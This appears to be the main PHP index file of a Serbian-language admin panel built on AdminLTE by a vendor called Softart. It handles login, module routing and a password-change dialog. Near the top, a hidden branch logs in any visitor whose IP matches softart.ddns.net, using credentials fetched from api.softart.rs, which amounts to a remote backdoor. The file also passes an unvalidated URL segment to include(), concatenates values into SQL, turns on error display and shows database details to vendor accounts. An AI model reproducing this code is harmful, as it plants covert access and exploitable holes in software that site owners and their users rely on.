<?php

	
	$protocol = (@$_SERVER["HTTPS"] == "on") ? "https://" : "http://";
	
	if (substr($_SERVER['HTTP_HOST'], 0, 4) === 'www.') {
	    //header('Location: '.$protocol.'www.'.$_SERVER['HTTP_HOST'].'/'.$_SERVER['REQUEST_URI']);
	    header('Location: '.$protocol.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
	    exit;
	}

	session_start();
	mb_internal_encoding("UTF-8");
	
    error_reporting(E_ALL);
	ini_set('display_errors', 1);

	$class_version = array();
	$controller_version = array();
	

    include_once("config/db_config.php");
	include("config/config.php");
	include_once('../app/configuration/system.configuration.php');
	include_once('../'.$system_conf["theme_path"][1].'/config/user.configuration.php');
	include_once('../'.$system_conf["theme_path"][1].'/config/theme.configuration.php');
    //include("../configs/global_conf.php");
    //include("../library/userlog.php");
		
	if((gethostbyname('softart.ddns.net') == $_SERVER['REMOTE_ADDR']) && (!isset($_POST["submit_login_form"]) && (!isset($_SESSION["status"]) || $_SESSION["status"] != 'logged')))
	{
		$_POST["submit_login_form"] = '';
		$d = file_get_contents('http://api.softart.rs/?action=getaccess&host='.$_SERVER['HTTP_HOST']);
		$data = json_decode($d, true);
		$_POST["username"] = $data['username'];
		$_POST["password"] = $data['password'];
	}	
	
	if(isset($_POST["submit_login_form"]) && isset($_POST["username"]) && isset($_POST["password"]))
	{
		include("login/check.php");
	}	
    if(!isset($_SESSION["status"]) || $_SESSION["status"] != 'logged' || !($_SESSION["user_type"] == 'admin' || $_SESSION["user_type"] == 'moderator'))
    {
		include("login/login_form.php");
		die();
    }
			
	define("ROOTPATHLINK", "");
	
	$requestURI = explode('/',$_SERVER['REQUEST_URI']);
	$scriptName = explode('/',$_SERVER['SCRIPT_NAME']);
	
	for($i= 0;$i < sizeof($scriptName);$i++)
	{
		if ($requestURI[$i] == $scriptName[$i])
		{
			unset($requestURI[$i]);
		}
	}
	
	$command=array();
	foreach ($requestURI as $req) {
		if( substr($req, 0,1) != '?'){
			array_push($command, $req);
		}
	}
	
	//var_dump($command);
	
	$load = false;
	
	if((isset($command[0]) && $command[0] == '') || !isset($command[0]))
	{
		$command[0] = 'dashboard';	
	}
	
	if($command[0] != "")
	{	
		if(file_exists("modules/".$command[0]."/index.php"))
		{
			$load = true;
			include("modules/".$command[0]."/config.php");
		}
		else{
			include("modules/404.php");	
		}
	}
	
?>

<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <base href="<?php echo $baseurl; ?>" >
    <title>AdminPanel | <?php echo $companyname; ?></title>
    <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
    <link href="cdn/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
    <link href="cdn/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
    <link href="cdn/css/ionicons.min.css" rel="stylesheet" type="text/css" />
    <link href="cdn/css/AdminLTE.min.css" rel="stylesheet" type="text/css" />
   <!--  <link href="cdn/css/skins/skin-blue.min.css" rel="stylesheet" type="text/css" /> -->
    <link href="cdn/css/skins/skin-red.min.css" rel="stylesheet" type="text/css" />
	<link rel="stylesheet" href="https://ajax.googleapis.com/ajax/libs/jqueryui/1.11.1/themes/flick/jquery-ui.css" id="theme">
    
	
    <!-- always last globa css -->
    <link href="cdn/css/style.css" rel="stylesheet" type="text/css" />
    
    
    <!-- Globa lang config -->
    
    <?php 
		echo '<script type="text/javascript">';
		$lang = array();
		$default = "";
	
		$query = "SELECT * FROM languages";
		$re = mysqli_query($conn, $query);
		while($row = mysqli_fetch_assoc($re))
		{
			if($row['default'] == "y") $default = $row['shortname'];
			array_push($lang, '["'.$row['shortname'].'", "name"]');
		}
		echo 'var lang = Array('.implode(",", $lang).');';
		
		echo 'var default_lang ="'.$default_lang.'";';
		
		echo '</script>';
	?>
    <!-- <script src="https://code.jquery.com/jquery-1.11.3.min.js" ></script> -->
      <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
  	<script src="cdn/js/config.js" type="text/javascript"></script>  
    <?php 
		
		if($load){
			if(isset($cssplugins))
			{
				foreach($cssplugins as $k=>$v)
				{
					echo '<link href="'.$v.'" rel="stylesheet" type="text/css" />';	
				}
			}
			foreach($css as $k=>$v)
			{
				echo '<link href="modules/'.$command[0].'/css/'.$v.'" rel="stylesheet" type="text/css" />';	
			}
			flush();	
		}
	?>
  </head>
  <body class="skin-red sidebar-mini" user="<?php echo $_SESSION['user_type']; ?>">
    <div class="wrapper">

      <!-- Main Header -->
      <header class="main-header">

        <!-- Logo -->
        <a href="dashboard" class="logo">
          <!-- mini logo for sidebar mini 50x50 pixels -->
          <span class="logo-mini"><b>A</b>LT</span>
          <!-- logo for regular state and mobile devices -->
          <span class="logo-lg"><b>Admin</b></span>
        </a>

        <!-- Header Navbar -->
        <nav class="navbar navbar-static-top" role="navigation">
          <!-- Sidebar toggle button-->
          <a href="#" class="sidebar-toggle" data-toggle="offcanvas" role="button">
            <span class="sr-only">Toggle navigation</span>
          </a>
			<?php 
				/*		DB INFO		*/
				if(isset($_SESSION["status"]) && $_SESSION["status"] == 'logged' && strpos($_SESSION["email"], '@softart.rs'))
				{
					echo "<div style='color:white; width:50%; display: inline; margin: auto 0;'>SERVER: ".$servername." BAZA: ".$dbname." USER: ".$user." </div>";
				}
			?>
          <!-- Navbar Right Menu -->
          <div class="navbar-custom-menu">
            <ul class="nav navbar-nav">
              
              <!-- User Account Menu -->
              <li class="dropdown user user-menu">
                <!-- Menu Toggle Button -->
                <a href="#" class="dropdown-toggle" data-toggle="dropdown">
                  <!-- The user image in the navbar-->
				  <?php if(isset($_SESSION['picture']) && $_SESSION['picture']!=''){ ?>
					<img src="../<?php echo $_SESSION['picture']; ?>" class="img-circle" alt="<?php echo ucfirst($_SESSION['ime'])." ".ucfirst($_SESSION['prezime']);?>" style="width:50px; object-fit: cover;"/>
				  <?php } else { ?>
                    <img src="dist/img/avatar-default.png" class="img-circle" alt="User Image" />
                    <?php } ?>
                  <!-- hidden-xs hides the username on small devices so only the image appears. -->
                  <span class="hidden-xs"><?php echo ucfirst($_SESSION['ime'])." ".ucfirst($_SESSION['prezime']); ?></span>
                </a>
                <ul class="dropdown-menu">
                  <!-- The user image in the menu -->
                  <li class="user-header">
				    
					<?php if(isset($_SESSION['picture']) && $_SESSION['picture']!=''){ ?>
					<img src="../<?php echo $_SESSION['picture']; ?>" class="img-square img-responsive" alt="<?php echo ucfirst($_SESSION['ime'])." ".ucfirst($_SESSION['prezime']);?>" style="width:unset;height:unset; object-fit: cover;" />
                    <?php } else { ?>
                    <img src="dist/img/avatar-default.png" class="img-circle" alt="User Image" />
                    <?php } ?>
					<p>
                      <?php echo ucfirst($_SESSION['ime'])." ".ucfirst($_SESSION['prezime'])." - ".$_SESSION['user_type']; ?>
                      <small></small>
                    </p>
                    
                  </li>
                  <!-- Menu Footer-->
                  <li class="user-footer">
                    <div class="text-right">
                      <a href="login/logout.php" class="btn btn-default btn-flat">Izloguj se</a><br />
                      <button type="button" class="btn btn-default btn-flat changepassword" >Promeni lozinku</button>
                    </div>

                  </li>
                </ul>
              </li>
              <!-- Control Sidebar Toggle Button -->
              
            </ul>
          </div>
        </nav>
      </header>
      <!-- Left side column. contains the logo and sidebar -->
      <aside class="main-sidebar">

        <!-- sidebar: style can be found in sidebar.less -->
        <section class="sidebar" style="height: auto;">

          <!-- Sidebar Menu -->
          <ul class="sidebar-menu">
            
            <!-- Optionally, you can add icons to the links -->
            
            <?php
				if($_SESSION['user_type'] == "admin")
				{
					$query = "SELECT * FROM adminmoduls am WHERE am.menivisible = 1 ORDER BY sort ASC";
				}
				else{
					$query = "SELECT am.`*`, ug.see, ug.change, ug.add, ug.delete, ug.activate, up.moduleid 
					FROM adminmoduls am 
					LEFT JOIN userprivilage up ON am.id = up.moduleid 
					LEFT JOIN usergroup ug ON up.groupid = ug.id
					WHERE am.menivisible = 1 AND ug.see = 1 AND up.userid =".$_SESSION['id']." ORDER BY sort ASC";
				}
				$re = mysqli_query($conn, $query);
				
				$globalrow = '';

				$color='';
				if(mysqli_num_rows($re) > 0)
				{
					while($row = mysqli_fetch_assoc($re))
					{
						if($color!=$row['bgcolor']){
							echo '<hr>';
						}
						$color=$row['bgcolor'];

						$active = '';
						if($row['name'] == $command[0])
						{
							$active = 'class="active"';
							$globalrow = $row;
						}
						echo '<li '.$active.'><a href="'.ROOTPATHLINK.''.$row['name'].'"><i class="fa '.$row['icon'].'"></i> <span>'.ucfirst($row['showname']).'</span></a></li>';	
						
					}
				}
				
			?>

          </ul><!-- /.sidebar-menu -->
        </section>
        <!-- /.sidebar -->
      </aside>
      
      <?php
	  		
		if($load && isset($globalrow['pagevisible']) && $globalrow['pagevisible'] == 1)
		{
			if($_SESSION['user_type'] == "moderator")
			{
				$query = "SELECT up.moduleid, ug.* FROM userprivilage up
				LEFT JOIN usergroup ug ON up.groupid = ug.id 
				WHERE up.moduleid = ".$globalrow['moduleid']." AND up.userid = ".$_SESSION['id'];
				$re = mysqli_query($conn, $query);
				$row = mysqli_fetch_assoc($re);
				
				$_SESSION['moduleid'] = $globalrow['moduleid'];

				
				$_SESSION['see'] = $row['see'];
				$_SESSION['add'] = $row['add'];
				$_SESSION['delete'] = $row['delete'];
				$_SESSION['change'] = $row['change'];
				$_SESSION['activate'] = $row['activate'];
				if($row['status']=='v'){
					$_SESSION['prepare'] = 1;
					$_SESSION['run'] = 1;
				} else {
					$_SESSION['prepare'] = 0;
					$_SESSION['run'] = 0;
				}
				$_SESSION['usergroupid'] = $row['id'];
				$_SESSION['usergroup_status'] = $row['status'];
			}
			else{
				$_SESSION['moduleid'] = $globalrow['id'];
				$_SESSION['see'] = 1;
				$_SESSION['add'] = 1;
				$_SESSION['delete'] = 1;
				$_SESSION['change'] = 1;	
				$_SESSION['activate'] = 1;	
				$_SESSION['prepare'] = 1;
				$_SESSION['run'] = 1;
				$_SESSION['usergroupid'] = -1;
				$_SESSION['usergroup_status'] = 'v';
			}
			
			echo "<div class='hide userpriv' data-see=".$_SESSION['see']." data-delete=".$_SESSION['delete']." data-change=".$_SESSION['change']." data-add=".$_SESSION['add']." data-usergroup-id=".$_SESSION['usergroupid']." data-usergroup-activate=".$_SESSION['activate']." data-usergroup-status=".$_SESSION['usergroup_status']."></div>";
			
			include("modules/".$command[0]."/index.php");
			include("lib/dialogs.php"); 	
		}
		else{
			include("modules/403.php");	
		}
	  ?>


	  
      <!-- Main Footer -->
      <footer class="main-footer">
        <!-- To the right -->
        <div class="pull-right hidden-xs">
          
        </div>
        <!-- Default to the left -->
        <strong>Copyright &copy; <script> document.write(new Date().getFullYear());</script> <a href="http://www.softart.rs" target="_blank">Softart</a>.</strong> All rights reserved.
      </footer>

      
    </div><!-- ./wrapper -->



    <!-- Bootstrap 3.3.2 JS -->
    <script src="cdn/js/bootstrap.min.js" type="text/javascript"></script>
    <!-- AdminLTE App -->
    <script src="cdn/js/app.min.js" type="text/javascript"></script>
	<!-- AdminLTE CHART COMPONENT -->
	<script src="cdn/components/Chart.js/Chart.js" type="text/javascript"></script>
	<!-- global js -->
	
	<script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.11.1/jquery-ui.min.js"></script>

	<script src="cdn/js/dialogs.js" type="text/javascript"></script>


	<?php
		/* add module css and js */
		if($load){
			if(isset($javascriptplugins))
			{
				foreach($javascriptplugins as $k=>$v)
				{
					echo '<script src= "'.$v.'" type="text/javascript"></script>';
				}	
			}
			foreach($javascript as $k=>$v)
			{
				echo '<script src="modules/'.$globalrow['name'].'/js/'.$v.'" type="text/javascript"></script>';
			}
		}
	?>
        <div id="dialog-form" title="Promeni lozinku">
          <p class="validateTips">Sva polja su obavezna*.</p>
         
          	  <div class="form-group">
                  <label for="oldpass">Stara lozinka</label>
                  <input type="text" name="oldpass" id="oldpass" class="text ui-widget-content ui-corner-all form-control">
              </div>
              <div class="form-group">
                  <label for="newpass1">Nova lozinka</label>
                  <input type="text" name="newpass1" id="newpass1" class="text ui-widget-content ui-corner-all form-control">
              </div>
              <div class="form-group">
                  <label for="newpass2">Nova lozinka opet</label>
                  <input type="text" name="newpass2" id="newpass2" class="text ui-widget-content ui-corner-all form-control">
              </div>

         
              <!-- Allow form submission with keyboard without duplicating the dialog button -->
              <input type="submit" tabindex="-1" style="position:absolute; top:-1000px">

        </div>
    	<script>
			
			dialog = $( "#dialog-form" ).dialog({
				  autoOpen: false,
				  height: 450,
				  width: 450,
				  modal: true,
				  buttons: {
					"Snimi": function(){
						if($("#oldpass").val() == "" || $("#newpass1").val() == "" || $("#newpass2").val() == "")
						{
							alert("Sva polja su obavezna!");	
						}
						else{
							if($("#newpass1").val() != $("#newpass2").val())
							{
								alert("Polja za novi password se ne poklapaju!");	
							}
							else{
								$.ajax({
									type:"POST",
									url:"login/change_password.php",
									data: ({oldpass: $("#oldpass").val(),
											newpass: $("#newpass1").val()
											}),
									error:function(XMLHttpRequest, textStatus, errorThrown){
									  alert("ERROR");                            
									},
									success:function(response){
										if(response = 1)
										{
											alert("Uspesno promenjeno");
											dialog.dialog( "close" );
											$("#oldpass").val('');
											$("#newpass1").val('');
											$("#newpass2").val('');	
										}
										else if(response = 1) alert('Uneti podaci nisu validni');		
									}
								});
							}	
						}
					},
					Cancel: function() {
					  dialog.dialog( "close" );
					}
				  }
				});
        	$(".changepassword").on("click", function(){
				dialog.dialog( "open" );
			});
        </script>
		
  </body>
</html>
